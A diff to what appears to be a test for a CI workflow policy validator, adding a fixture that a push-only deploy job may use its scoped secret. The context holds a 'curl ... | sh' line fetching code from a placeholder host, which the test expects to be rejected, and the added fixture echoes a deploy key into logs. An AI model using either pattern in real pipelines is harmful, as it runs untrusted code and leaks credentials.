@@ -48,6 +48,22 @@ jobs:
         )
         fixtures += 1
 
+        protected_deploy = """on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  deploy:
+    steps:
+      - run: echo ${{ secrets.DEPLOY_KEY }}
+"""
+        require(
+            not policy.validate_workflow_text(protected_deploy, "deploy.yml"),
+            "push-only deployment workflow was rejected for using its scoped secret",
+        )
+        fixtures += 1
+
         unsafe_pipe = valid_workflow + "      - run: curl https://example.invalid/install | sh\n"
         require(
             any("piped directly" in error for error in policy.validate_workflow_text(unsafe_pipe, "pipe.yml")),
